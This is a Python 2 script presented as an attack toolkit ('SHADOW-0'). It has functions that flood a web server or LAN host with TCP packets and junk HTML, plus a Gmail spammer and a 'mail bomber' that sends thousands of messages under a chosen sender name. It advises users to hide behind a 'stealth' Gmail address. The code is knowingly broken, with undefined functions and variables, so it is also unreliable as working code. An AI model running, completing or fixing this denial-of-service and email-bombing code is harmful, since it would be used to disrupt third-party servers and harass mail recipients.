#!/usr/bin/python
# buggy 
# in order to prevent codes abuse by lammer :)

__author__   = 'vickydasta'
__appsname__ = 'shits.py'
__version__  = '1.2'
__date__     = '08/02/15'

import smtplib
import socket
import sys
import time
import smtplib
import email
import os
import random
from email.MIMEMultipart import MIMEMultipart
from email.Utils import COMMASPACE
from email.MIMEBase import MIMEBase
from email.parser import Parser
from email.MIMEImage import MIMEImage
from email.MIMEText import MIMEText
from datetime import datetime 

def ask():

    os.system('clear')
    print banner
    while True:
        jawab = input('>>> ')
        cmdlist=[1,2,3,4,5,help]
        if jawab in cmdlist:
            if jawab == 1:
                webServer()
            elif jawab == 2:
                LAN_DOS()
            elif jawab == 3:
                mail()
            elif jawab == 4:
                about()
            elif jawab == 5:
                sys.exit('[+] terminatting program...')
        else:
            print 'type help for more info.'

def collectgarbage(url):
    # collect some garbage
    # from urllib and read given url data
    # html's contains unexpected string,it should be able to
    # slow down the target's machine
    import urllib2
    data=urllib2.urlopen(url)
    return data.read()

def about():
    about = ''
    print about
    time.sleep(7)
    return tanya()

def DoS2(ip):
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    byte = random._urandom(0)
    try:
        sock.connect((target_ip,port_ip))
    except:
        print '[-] Unable to resolve host...'
        time.sleep(3)
        return tanya()
    while 1 == 1:
        try:
            while 1==1:
                for i in range (1,10000):
                    print '[+] now sending ',byte ,' to ',target_ip
                    sock.sendall(byte)
                    sock.sendall(byte)
        except OverflowError as e:
            print '[+] error' + str(e)
            return tanya()

def webserver(host,itter,packets,iter):
    port = 80
    if len(host) < 1:
        sys.exit()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error, msg:
        print '[-] failed to create socket. Error code: ' + str(msg)
        print '[+] Socket created'
    try:
        remote_ip = socket.gethostbyname(host)
    except socket.gaierror:
        print "[-]Hostname could not be resolved... Exiting..."
        sys.exit()
    try:
        s.connect((host, port))
    except socket.error:
        print "[-] Unable to connect,exiting...."
        sys.exit()
    print '[+] Connected to ' + host , ":" , port
    message = "POST / HTTP/1.1\r\n\r\n"
    try:
        for i in range(1,itter):
            s.sendall(pesan)
            s.sendall(message)
            s.sendall("POST /" + host + "HTTP/1.1")
            s.sendall("GET /" + host + "HTTP/1.1\r\n\r\n")
            print "[+] sending packet(s) {} to {}".format(i,host)
            print i ," packets has been sent to {}".format(host)
    except socket.error:
            print '[-] sending failed...'
            print '[=] ' + host + " rejecting packets or its not vulnerable with DoS attack"
            return tanya()
def LAN():
    os.system('clear')
    print '#' * 100
    konek = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ip = raw_input('[?] Host Target IP > ')
    port = input('[?] Open Port (Default 53) >  ')
    try:
        a = konek.connect((ip, port))
    except Exception as e:
        print '[-] Unable to resolve host ',ip ,'...'
        time.sleep(3)
        return tanya()
    print '[+] Connected to ' + str(ip)
    print '[+] Now Sending Packet(s) to ' + str(ip)
    paket = '''
    <!DOCTYPE html><html manifest="/_/chrome/newtab/manifest?espv=2&amp;ie=UTF-8" lang="id"><head><style>.fkbx{}#fkbx-hht{}.fkbx-hht-s{}.hide-sf{}.lg-init{}.mv-locthumb{}.mv-locgradient{}.mv-loctitle{}.mv-locfallback{}.mv-tiles{}.prm-pt{}.prm{}.prt{}.pt{}body{font:small arial,sans-serif;margin:0;min-height:616px;text-align:-webkit-center}body._jK,body.hide-sf #fkbx,body.hide-sf #lga,#lga.lg-init{visibility:hidden}a{color:#12c;text-decoration:none}a:hover,a:active{text-decoration:underline}a:visited{color:#609}#most-visited{margin-top:50px;z-index:1}#mv-tiles{height:260px;margin:auto;overflow:hidden;padding:0 1em;text-align:start;white-space:nowrap;width:300px}.mv-row{margin-bottom:50px}.mv-tile:first-child{-webkit-margin-start:0}.mv-tile{-webkit-margin-start:20px;-webkit-transition:margin 200ms;-webkit-transition-property:margin,opacity,width,-webkit-transform;background:-webkit-linear-gradient(#f2f2f2,#e8e8e8);border:1px solid transparent;border-radius:3px;box-shadow:inset 0 2px 3px rgba(0,0,0,.09);display:inline-block;height:83px;position:relative;width:138px}.mv-tile.mv-bl{-webkit-margin-start:0;-webkit-transform:scale(0.5);opacity:0;width:0}.mv-page{border:1px solid #c0c0c0;cursor:pointer;outline:none}.mv-page:hover,.mv-page:focus{border-color:#7f7f7f}.mv-thumb,.mv-mask,.mv-locthumb,.mv-locgradient,.mv-locfallback{border:none;height:83px;left:0;position:absolute;top:0;width:138px}.mv-
        '''
    try:
        for i in range(1,100000):
            aw = datetime.now()
            konek.sendall('011001010010001011000111101001010011')
            konek.sendall(paket)
            konek.sendall(paket)
            konek.sendall(paket)
            konek.sendall(paket)
            konek.sendall('0110010100101010010101010101001011100011000010101011')
            print '[+] ' ,i , ' packets has been sent to ' ,ip
    except Exception as e:
        aw2 = datetime.now()
        print '[-] ',e
        print '[+] DoS Stoped on ',aw2 - aw
        time.sleep(5)
        os.system('clear')
        return tanya()

def LAN_DOS():
    os.system('clear')
    banner = '''
#####################################
##     SHADOW-0 LAN DoS        ######
#####################################

>>>>>>>>>>> DoS Method <<<<<<<<<<<<<

   1. Method 1 (Random packets)
   2. Method 2 (Normal Packets)

 '''
    print banner
    ask = raw_input('[?] ')
    while True:
        ask !='exit'
        if ask == 1:
            dosMethod2()
        elif ask == 2:
            LAN()
        else:
            return tanya()
        


def spammer(mail,passw,multi=False):
    smtp_host = 'smtp.gmail.com'
    smtp_port = 587
    server = smtplib.SMTP()
    server.connect(smtp_host,smtp_port)
    server.ehlo()
    server.starttls()
    os.system('clear')
    print '[+] Mail Spammer activated...' 
    print '[+] Connected to ' , smtp_host , ' on port ' , smtp_port
    print '[+] USE YOUR STEALTH GMAIL ADDRESS OR TAKE IT WITH YOUR OWN RISK !!!'    
    try:
        server.login(user,passw)
    except Exception as e:
        print str(e)
    try:
        spam = open(fromaddr,'r')
    except IOError as e:
        print '[+] Unable to find ' + str(fromaddr)
        time.sleep(3)
        return tanya()
    sub = raw_input('[+] Subject: ')
    msg = email.MIMEMultipart.MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = email.Utils.COMMASPACE.join(fromaddr)
    msg['Subject'] = sub
    msg.attach(MIMEText(raw_input('[+] Body: ')))
    msg.attach(MIMEText('\nYour Shadow_', 'plain'))
    try:
        w1 = datetime.now()
        for a in spam.readlines():
            for i in range(1, 5):
                server.sendmail(user,a,msg.as_string())
                print '[+] ',i ,' e-mail(s) sent to ' + str(a)
                
    except Exception as e:
        w2 = datetime.now()
        print '[-] ',e ,' at ' ,w2 - w1

def mail():
    
    smtp_host = 'smtp.gmail.com'
    smtp_port = 587
    server = smtplib.SMTP()
    server.connect(smtp_host,smtp_port)
    server.ehlo()
    server.starttls()
    os.system('clear')
    banner = '''
    ##############################
    ###        MAILER          ###
    ##############################

    1. Mail Spammmer
    2. Mail Boomber
    '''
    
    print '[+] Connected to ' , smtp_host , ' on port ' , smtp_port
    print banner

    menu = raw_input('[?] > ')
    if menu == 1:
        spammer()
    if menu == 2:
        t1 = datetime.now()
        os.system('clear')
        print '[+] Boom E-Mail Activated...'
        print '[+] USE YOUR STEALTH GMAIL ADDRESS OR TAKE IT WITH YOUR OWN RISK !!!'
        smtp_host = 'smtp.gmail.com'
        smtp_port = 587
        server = smtplib.SMTP()
        server.connect(smtp_host,smtp_port)
        server.ehlo()
        server.starttls()
        print '[+] Connected to ' , smtp_host , ' on port ' , smtp_port
        print '[+] USE YOUR STEALTH GMAIL ADDRESS OR TAKE IT WITH YOUR OWN RISK !!!'    
        user = raw_input('[+] >> Gmail Address > ')
        passw = raw_input('[+] >> Gmail Password > ')
        try:
            server.login(user,passw)
        except Exception as e:
            print str(e)
        fromaddr = raw_input('[+] Send mail by the name of: ')
        tolist = raw_input('[+] To: ')
        sub = raw_input('[+] Subject: ')
        msg = email.MIMEMultipart.MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = email.Utils.COMMASPACE.join(tolist)
        msg['Subject'] = sub
        msg.attach(MIMEText(raw_input('[+] Body: ')))
        msg.attach(MIMEText('[URGENT]', 'plain'))
        try:
            d1 = datetime.now()
            for i in range(1, 10000):
                
                server.sendmail(user,tolist,msg.as_string())
                print '[+] ',i ,' e-mail(s) sent to ' + str(tolist)
                
        except Exception as e:
            print '[+] Total sent : ' ,i-1 ,'mails'
            print '[+] Error : ',str(e)
            d2 = datetime.now()
            print '[-} Error at ' ,d2 - d1
            return ask()
    else:
        return tanya()

if __name__ == '__main__':
    ask()
